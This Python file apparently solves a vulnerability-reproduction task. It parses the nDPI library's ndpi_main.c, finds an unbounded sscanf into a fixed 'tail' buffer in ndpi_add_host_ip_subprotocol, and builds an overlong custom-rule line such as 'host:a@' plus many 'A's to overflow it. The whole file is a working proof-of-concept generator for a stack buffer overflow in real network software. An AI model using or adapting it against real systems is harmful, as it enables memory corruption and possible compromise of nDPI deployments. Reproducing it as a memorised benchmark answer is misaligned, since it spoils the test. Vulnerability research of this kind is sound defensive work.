import os
import re
import tarfile
from typing import List, Optional, Tuple, Dict, Any


def _read_text_file_from_tar(tar_path: str, filename_endswith: str) -> Optional[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            members = [m for m in tf.getmembers() if m.isfile() and m.name.replace("\\", "/").endswith(filename_endswith)]
            if not members:
                # fallback: any member that contains the filename
                members = [m for m in tf.getmembers() if m.isfile() and m.name.replace("\\", "/").endswith("/" + filename_endswith)]
            if not members:
                # brute: any with exact basename
                base = os.path.basename(filename_endswith)
                members = [m for m in tf.getmembers() if m.isfile() and os.path.basename(m.name) == base]
            if not members:
                return None
            m = min(members, key=lambda x: len(x.name))
            f = tf.extractfile(m)
            if f is None:
                return None
            data = f.read()
            try:
                return data.decode("utf-8", errors="replace")
            except Exception:
                return data.decode("latin-1", errors="replace")
    except Exception:
        return None


def _read_text_file_from_dir(root: str, filename: str) -> Optional[str]:
    target = None
    base = os.path.basename(filename)
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == base:
                p = os.path.join(dirpath, fn)
                target = p
                break
        if target:
            break
    if not target:
        return None
    try:
        with open(target, "rb") as f:
            data = f.read()
        try:
            return data.decode("utf-8", errors="replace")
        except Exception:
            return data.decode("latin-1", errors="replace")
    except Exception:
        return None


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        c = s[i]
        i += 1
        if c == "n":
            out.append("\n")
        elif c == "r":
            out.append("\r")
        elif c == "t":
            out.append("\t")
        elif c == "v":
            out.append("\v")
        elif c == "f":
            out.append("\f")
        elif c == "a":
            out.append("\a")
        elif c == "b":
            out.append("\b")
        elif c == "\\":
            out.append("\\")
        elif c == "'":
            out.append("'")
        elif c == '"':
            out.append('"')
        elif c == "?":
            out.append("?")
        elif c in "01234567":
            # octal up to 3 digits, including this one
            val = ord(c) - ord("0")
            cnt = 1
            while cnt < 3 and i < n and s[i] in "01234567":
                val = (val << 3) + (ord(s[i]) - ord("0"))
                i += 1
                cnt += 1
            out.append(chr(val & 0xFF))
        elif c == "x":
            # hex variable length (at least 1)
            val = 0
            cnt = 0
            while i < n and s[i].lower() in "0123456789abcdef":
                val = (val << 4) + int(s[i], 16)
                i += 1
                cnt += 1
            if cnt == 0:
                out.append("x")
            else:
                out.append(chr(val & 0xFF))
        else:
            out.append(c)
    return "".join(out)


def _parse_c_string_concat(s: str, i: int) -> Tuple[Optional[str], int]:
    # Parses one or more adjacent C string literals starting at i (which should point to the first quote).
    # Returns (decoded_string, index_after_last_literal_or_original_i_if_fail)
    n = len(s)
    if i >= n or s[i] != '"':
        return None, i
    parts = []
    j = i
    while True:
        if j >= n or s[j] != '"':
            break
        j += 1
        raw = []
        while j < n:
            c = s[j]
            if c == '"':
                j += 1
                break
            if c == "\\":
                if j + 1 < n:
                    raw.append(c)
                    raw.append(s[j + 1])
                    j += 2
                else:
                    raw.append(c)
                    j += 1
            else:
                raw.append(c)
                j += 1
        parts.append(_c_unescape("".join(raw)))
        # skip whitespace between adjacent string literals
        k = j
        while k < n and s[k] in " \t\r\n":
            k += 1
        if k < n and s[k] == '"':
            j = k
            continue
        j = k
        break
    return "".join(parts), j


def _find_matching(s: str, start: int, open_ch: str, close_ch: str) -> int:
    # start points to open_ch
    n = len(s)
    depth = 0
    i = start
    in_str = False
    in_chr = False
    esc = False
    while i < n:
        c = s[i]
        if in_str:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            i += 1
            continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue
        if c == open_ch:
            depth += 1
        elif c == close_ch:
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _split_top_level_commas(s: str) -> List[str]:
    out = []
    cur = []
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    in_str = False
    in_chr = False
    esc = False
    for c in s:
        if in_str:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            continue
        if in_chr:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            continue
        if c == '"':
            in_str = True
            cur.append(c)
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            continue
        if c == "(":
            depth_par += 1
            cur.append(c)
            continue
        if c == ")":
            depth_par = max(0, depth_par - 1)
            cur.append(c)
            continue
        if c == "{":
            depth_br += 1
            cur.append(c)
            continue
        if c == "}":
            depth_br = max(0, depth_br - 1)
            cur.append(c)
            continue
        if c == "[":
            depth_sq += 1
            cur.append(c)
            continue
        if c == "]":
            depth_sq = max(0, depth_sq - 1)
            cur.append(c)
            continue
        if c == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
            out.append("".join(cur).strip())
            cur = []
        else:
            cur.append(c)
    if cur:
        out.append("".join(cur).strip())
    return out


def _extract_function(text: str, func_name: str) -> Optional[str]:
    # find a function definition by name and return its full text (from name to matching '}')
    # Heuristic: match "func_name(" followed by ')' and then '{' not preceded by ';' (to avoid prototypes).
    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(", re.MULTILINE)
    for m in pat.finditer(text):
        start = m.start()
        # ensure this is definition: find next '{' after the parameter list
        paren_open = text.find("(", m.end() - 1)
        if paren_open == -1:
            continue
        paren_close = _find_matching(text, paren_open, "(", ")")
        if paren_close == -1:
            continue
        # skip whitespace/comments to find '{' or ';'
        i = paren_close + 1
        n = len(text)
        while i < n and text[i] in " \t\r\n":
            i += 1
        # skip possible attributes and return type qualifiers between ) and {
        # If we see ';' before '{', it's a prototype.
        j = i
        # scan until '{' or ';' or '\n' too far
        limit = min(n, paren_close + 800)
        brace_pos = -1
        while j < limit:
            c = text[j]
            if c == "{":
                brace_pos = j
                break
            if c == ";":
                brace_pos = -1
                break
            if c == '"' or c == "'":
                # skip strings
                if c == '"':
                    endq = j + 1
                    esc = False
                    while endq < limit:
                        cc = text[endq]
                        if esc:
                            esc = False
                        elif cc == "\\":
                            esc = True
                        elif cc == '"':
                            endq += 1
                            break
                        endq += 1
                    j = endq
                    continue
                else:
                    endq = j + 1
                    esc = False
                    while endq < limit:
                        cc = text[endq]
                        if esc:
                            esc = False
                        elif cc == "\\":
                            esc = True
                        elif cc == "'":
                            endq += 1
                            break
                        endq += 1
                    j = endq
                    continue
            j += 1
        if brace_pos == -1:
            continue
        brace_end = _find_matching(text, brace_pos, "{", "}")
        if brace_end == -1:
            continue
        return text[start:brace_end + 1]
    return None


def _extract_identifier(expr: str) -> Optional[str]:
    # remove casts and address-of and array indexing, get last identifier
    # Example: "&tail[0]" -> "tail"
    # Example: " (char*)tail " -> "tail"
    expr = expr.strip()
    if not expr:
        return None
    # remove leading & and *
    expr = expr.lstrip("&* \t\r\n")
    # remove casts ( ... )
    while True:
        expr2 = expr.strip()
        if expr2.startswith("("):
            close = _find_matching(expr2, 0, "(", ")")
            if close != -1:
                # if it's a cast, it should be followed by something without operator
                expr = expr2[close + 1:].strip()
                continue
        break
    # strip array indexing and member accesses, keep last identifier
    ids = re.findall(r"[A-Za-z_]\w*", expr)
    if not ids:
        return None
    return ids[-1]


def _parse_scanf_format(fmt: str) -> List[Dict[str, Any]]:
    convs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        i += 1
        if i >= n:
            break
        suppress = False
        if fmt[i] == "*":
            suppress = True
            i += 1
        width = None
        if i < n and fmt[i].isdigit():
            j = i
            while j < n and fmt[j].isdigit():
                j += 1
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        # length modifiers
        if i < n and fmt[i] in "hljztL":
            if fmt[i] == "l" and i + 1 < n and fmt[i + 1] == "l":
                i += 2
            else:
                i += 1
        if i >= n:
            break
        spec = fmt[i]
        i += 1
        scanset = None
        neg = False
        if spec == "[":
            # parse until ']'
            if i < n and fmt[i] == "^":
                neg = True
                i += 1
            set_start = i
            if i < n and fmt[i] == "]":
                i += 1
            while i < n and fmt[i] != "]":
                i += 1
            scanset = fmt[set_start:i]
            if i < n and fmt[i] == "]":
                i += 1
            spec = "["
        convs.append({"suppress": suppress, "width": width, "spec": spec, "scanset": scanset, "negated": neg})
    return convs


def _scanset_allows(scanset: str, negated: bool, ch: str) -> bool:
    if scanset is None:
        return True
    # parse positive set membership
    allowed = False
    i = 0
    n = len(scanset)
    while i < n:
        c = scanset[i]
        if i + 2 < n and scanset[i + 1] == "-" and scanset[i + 2] != "]":
            a = scanset[i]
            b = scanset[i + 2]
            if a <= ch <= b or b <= ch <= a:
                allowed = True
            i += 3
        else:
            if c == ch:
                allowed = True
            i += 1
    return (not allowed) if negated else allowed


def _pick_char_for_scanset(scanset: str, negated: bool) -> str:
    # prefer letters/digits; avoid whitespace and common delimiters
    candidates = list("AaZz09BbYyXx1")
    candidates += [".", "_", "-", "@"]
    # include a broader set if needed
    for ch in candidates:
        if ch.isspace():
            continue
        if _scanset_allows(scanset, negated, ch):
            return ch
    for code in range(33, 127):
        ch = chr(code)
        if _scanset_allows(scanset, negated, ch):
            return ch
    return "A"


def _build_string_from_format(fmt: str, values: List[str]) -> str:
    out = []
    i = 0
    n = len(fmt)
    val_i = 0
    while i < n:
        c = fmt[i]
        if c != "%":
            # whitespace in format: scanf treats it as skip any whitespace; output one space
            if c in " \t\r\n\v\f":
                out.append(" ")
            else:
                out.append(c)
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            out.append("%")
            i += 2
            continue
        i += 1
        if i >= n:
            break
        suppress = False
        if fmt[i] == "*":
            suppress = True
            i += 1
        width = None
        if i < n and fmt[i].isdigit():
            j = i
            while j < n and fmt[j].isdigit():
                j += 1
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        # length modifiers
        if i < n and fmt[i] in "hljztL":
            if fmt[i] == "l" and i + 1 < n and fmt[i + 1] == "l":
                i += 2
            else:
                i += 1
        if i >= n:
            break
        spec = fmt[i]
        i += 1
        neg = False
        scanset = None
        if spec == "[":
            if i < n and fmt[i] == "^":
                neg = True
                i += 1
            set_start = i
            if i < n and fmt[i] == "]":
                i += 1
            while i < n and fmt[i] != "]":
                i += 1
            scanset = fmt[set_start:i]
            if i < n and fmt[i] == "]":
                i += 1
            spec = "["
        if suppress:
            # for suppressed assignments, still need input token
            if spec in "diuoxX":
                token = "0"
            elif spec in "fFeEgGaA":
                token = "0"
            elif spec == "c":
                token = "A" * (width if (width is not None and width > 0) else 1)
            elif spec == "s":
                token = "A"
            elif spec == "[":
                token = _pick_char_for_scanset(scanset or "", neg)
            else:
                token = "A"
        else:
            token = values[val_i] if val_i < len(values) else "A"
            val_i += 1
            if spec in "diuoxX":
                token = "0" if not token or not re.fullmatch(r"[+-]?\d+", token) else token
            elif spec in "fFeEgGaA":
                token = "0"
            elif spec == "c":
                need = width if (width is not None and width > 0) else 1
                if len(token) < need:
                    token = (token + ("A" * need))[:need]
                elif len(token) > need:
                    token = token[:need]
            elif spec == "s":
                # must not contain whitespace
                if any(ch.isspace() for ch in token):
                    token = "".join(ch for ch in token if not ch.isspace()) or "A"
                if width is not None and len(token) > width:
                    token = token[:width]
            elif spec == "[":
                if scanset is not None:
                    good_ch = _pick_char_for_scanset(scanset, neg)
                    # ensure all chars allowed; if not, replace
                    if any(not _scanset_allows(scanset, neg, ch) for ch in token):
                        token = good_ch * max(1, len(token))
                    if width is not None and len(token) > width:
                        token = token[:width]
                else:
                    if width is not None and len(token) > width:
                        token = token[:width]
            else:
                if width is not None and len(token) > width:
                    token = token[:width]
        out.append(token)
    return "".join(out)


def _parse_sscanf_calls(text: str) -> List[Dict[str, Any]]:
    calls = []
    for m in re.finditer(r"\b(?:__isoc99_sscanf|sscanf)\s*\(", text):
        call_start = m.start()
        paren_open = text.find("(", m.end() - 1)
        if paren_open == -1:
            continue
        paren_close = _find_matching(text, paren_open, "(", ")")
        if paren_close == -1:
            continue
        inside = text[paren_open + 1:paren_close]
        args = _split_top_level_commas(inside)
        if len(args) < 2:
            continue
        fmt_arg = args[1].strip()
        # parse format literal
        fmt = None
        if fmt_arg.startswith('"'):
            fmt, _ = _parse_c_string_concat(fmt_arg, 0)
        else:
            # sometimes there is cast or parentheses around string literal
            tmp = fmt_arg.lstrip(" \t\r\n(")
            if tmp.startswith('"'):
                fmt, _ = _parse_c_string_concat(tmp, 0)
        if fmt is None:
            continue
        dest_args = args[2:]
        dest_ids = []
        for da in dest_args:
            dest_ids.append(_extract_identifier(da) or "")
        calls.append({
            "call_start": call_start,
            "args": args,
            "fmt": fmt,
            "dest_args": dest_args,
            "dest_ids": dest_ids,
        })
    return calls


def _find_tail_buffer_size(func_text: str) -> Optional[int]:
    # Find local array declaration for tail
    # Examples: char tail[32]; or u_char tail[64];
    m = re.search(r"\btail\s*\[\s*(\d+)\s*\]", func_text)
    if not m:
        return None
    try:
        return int(m.group(1))
    except Exception:
        return None


def _is_string_like_conv(conv: Dict[str, Any]) -> bool:
    spec = conv.get("spec")
    if spec == "s":
        return True
    if spec == "[":
        return True
    # %c doesn't overflow unless width>1; not our target
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        ndpi_main = None
        if os.path.isdir(src_path):
            ndpi_main = _read_text_file_from_dir(src_path, "ndpi_main.c")
        else:
            ndpi_main = _read_text_file_from_tar(src_path, "src/lib/ndpi_main.c")
            if ndpi_main is None:
                ndpi_main = _read_text_file_from_tar(src_path, "ndpi_main.c")

        if not ndpi_main:
            return (b"host:a@" + (b"A" * 48) + b"\n")

        func = _extract_function(ndpi_main, "ndpi_add_host_ip_subprotocol")
        if not func:
            return (b"host:a@" + (b"A" * 48) + b"\n")

        tail_size = _find_tail_buffer_size(func)
        if not tail_size or tail_size <= 0:
            tail_size = 32

        calls = _parse_sscanf_calls(func)
        candidates: List[str] = []

        for call in calls:
            dest_ids = call["dest_ids"]
            if not dest_ids:
                continue
            # Try to find 'tail' destination
            if "tail" not in dest_ids:
                continue
            tail_dest_index = dest_ids.index("tail")
            fmt = call["fmt"]
            convs = _parse_scanf_format(fmt)
            # Map non-suppressed conversions to dest indices
            nonsupp_convs = [c for c in convs if not c.get("suppress")]
            if tail_dest_index >= len(nonsupp_convs):
                continue
            tail_conv = nonsupp_convs[tail_dest_index]
            # Require string-like and no width bound
            if not _is_string_like_conv(tail_conv):
                continue
            if tail_conv.get("width") is not None:
                continue

            # Build values for each non-suppressed conversion
            values: List[str] = []
            for idx, conv in enumerate(nonsupp_convs):
                spec = conv.get("spec")
                width = conv.get("width")
                if idx == tail_dest_index:
                    if spec == "s":
                        token = "A" * (tail_size + 1)
                    elif spec == "[":
                        scanset = conv.get("scanset") or ""
                        neg = bool(conv.get("negated"))
                        ch = _pick_char_for_scanset(scanset, neg)
                        token = ch * (tail_size + 1)
                    else:
                        token = "A" * (tail_size + 1)
                else:
                    if spec in "diuoxX":
                        token = "0"
                    elif spec in "fFeEgGaA":
                        token = "0"
                    elif spec == "c":
                        token = "A" * (width if (width is not None and width > 0) else 1)
                    elif spec == "s":
                        token = "a"
                        if width is not None and width > 0:
                            token = token[:width]
                    elif spec == "[":
                        scanset = conv.get("scanset") or ""
                        neg = bool(conv.get("negated"))
                        token = _pick_char_for_scanset(scanset, neg)
                        if width is not None and width > 0:
                            token = token[:width]
                    else:
                        token = "a"
                        if width is not None and width > 0:
                            token = token[:width]
                values.append(token)

            s = _build_string_from_format(fmt, values)
            if not s.endswith("\n"):
                s += "\n"
            candidates.append(s)

        if candidates:
            best = min(candidates, key=len)
            try:
                return best.encode("ascii", errors="ignore")
            except Exception:
                return best.encode("utf-8", errors="ignore")

        # Fallback heuristics if we couldn't locate the exact sscanf call
        # Try common custom rules format:
        # host:<head>@<tail>
        tail = b"A" * (tail_size + 1)
        return b"host:a@" + tail + b"\n"